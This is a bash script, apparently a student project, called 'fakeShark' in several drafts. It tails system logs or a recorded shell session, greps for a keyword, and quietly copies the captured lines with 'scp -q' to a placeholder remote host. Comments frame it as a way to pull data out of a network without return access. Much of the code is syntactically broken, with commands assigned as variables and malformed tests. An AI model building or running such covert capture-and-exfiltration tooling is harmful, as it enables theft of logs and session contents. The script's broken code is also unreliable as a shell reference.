echo "   __      _         _____ _                _    "
echo "  / _|    | |       / ____| |              | |   "
echo " | |_ __ _| | _ ___| (___ | |__   __ _ _ __| | __"
echo " |  _/ _` | |/ / _ \\___ \| '_ \ / _` | '__| |/ /"
echo " | || (_| |   <  __/____) | | | | (_| | |  |   < "
echo " |_| \__,_|_|\_\___|_____/|_| |_|\__,_|_|  |_|\_\"
echo " Written  by Nikol.AI & Carbon"


#!/bin/bash
basicShark=tail $1 | tee ~/Documents/fakeShark.txt | grep -i $2

while true;
        do $basicShark
        if ~/Documents/fakeShark.txt wc -l < 5;
        then :
        elif ~/Documents/fakeShark.txt wc -l > 6;
        then
                scp -q -r fakeShark.txt remote_username@ip_address:/foo/bar
        fi
        done
exit 0

--------OR SLEEP VERSION

#!/bin/bash
tail -f $1 | tee fakeShark.txt | grep -i $2 & sleep 3600
scp -q -r fakeShark.txt remote_username@ip_address:/foo/bar
exit 0

--------To Grab Files

./fakeShark.sh /var/log/messages zip

------------------------------------Older Versions Below--------------------

#!/bin/bash
basicShark=tail -f $1 | tee fakeShark.txt | grep -i $2

if $1 = ""
then 
echo "You need to input a valid file location"
elif $2 = ""
then 
echo "You need a valid search parameter"
else
then
;
fi

if basicShark wc -l < 500
        then
                :
        elif basicShark wc -l > 1000
        then
                scp -q -r fakeShark.txt remote_username@ip_address:/foo/bar
        fi
done

------------------------------------------------

#!/bin/bash
basicShark=tail -f $1 | tee fakeShark.txt | grep -i $2
while basicShark wc -l < 1000000
        if basicShark wc -l > 500
        scp (Server address stuff)fakeShark.txt; do
        fi
done

------------------------------------------------

basicShark=tail -f script[file] | tee fakeShark.txt | grep -i zip

while basicShark wc -l < 1000000
	if basicShark wc -l > 500
	rsync touch fakeShark{1..2000}.txt; do
	fi
done

# tail -f will display input as it occurs
# will record from /var/log/messages as input is done
# tee fakeShark.txt will send standard output to both ls.txt
# as well as original destination
# See TLCL pg 64-66

# grep -i will seach the files for a key word
# -i makes this be non case sensative, grep alone is
# See TLCL pg 63-64

# could combine grep with alternation
# alternation allows grep to seach for strings
# example
# echo "AAA" | grep AAA
# can add | to search for my criteria
# could use to sift for specific informatio / data types
# See TLCL pg 263-264

# could use find command
# or locate command
# instead of grep
# See TLCL pg 269-270

# could use less command or vim command
# to read file and find related information under a header
# See pg 270-271

# zip is the keyword in this case
# combine keyword with wildcards for increase versatility
# example, anchors
# beginning of the line (^) 
# or at the end of the line ($)
# '^zip' OR 'zip$'
# use of anchors allows for finding parts of keyword in whole
# See pg 25-27, 69-70, 253-257


# OR use script[file]
# would be in place of /var/log/messages
# script records the whole shell session
# file being where you want everything to be copied to
# see TLCL pg 88

# can combine with rsync and spsh
# this in order to copy data from the file created
# then sent elsewhere securely
# this would largely be if one did not have
# easy return access to the network
# rsync -av playground foo
# -av = options
# playground = source file / directory
# foo = destination file
# where source and destination are one of the following:
# ● A local file or directory
# ● A remote file or directory in the form of [user@]host:path
# ● A remote rsync server specified with a URI of rsync://[user@]host[:port]/path
# See TLCL pg 246-248
